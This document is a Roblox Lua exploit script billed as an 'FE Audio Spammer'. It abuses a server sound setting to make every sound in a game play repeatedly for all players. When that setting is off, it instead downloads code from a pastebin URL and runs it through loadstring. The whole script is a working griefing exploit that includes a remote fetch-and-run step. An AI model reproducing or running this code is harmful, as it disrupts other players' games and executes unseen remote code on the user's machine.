--[[


OOooOoO o.OOoOoo          Oo                o                .oOOOo.                        
o        O               o  O              O  o              o     o                        
O        o              O    o             o                 O.                             
oOooO    ooOO          oOooOoOo            o                  `OOoo.                        
O        O             o      O O   o  .oOoO  O  .oOo.             `O .oOo. .oOoO' `oOOoOO. 
o        o             O      o o   O  o   O  o  O   o              o O   o O   o   O  o  o 
o        O             o      O O   o  O   o  O  o   O       O.    .O o   O o   O   o  O  O 
O'      ooOooOoO       O.     O `OoO'o `OoO'o o' `OoO'        `oooO'  oOoO' `OoO'o  O  o  o 
                                                                      O                     
                                                                      o'                                                                                                            
                                        
 FE Audio Spammer created by Unknown
 Finds a random workspace audio and spams the sh*t out
 of it. (Everyone on the server can hear too)

]]--

if game.SoundService.RespectFilteringEnabled == false then
while wait(1) do
for i,v in pairs(game:GetDescendants()) do
if v:IsA("Sound") then 
v:Play()
end
end
end
else
loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
notify("Sound is unexploitable.", warn(":("))
end


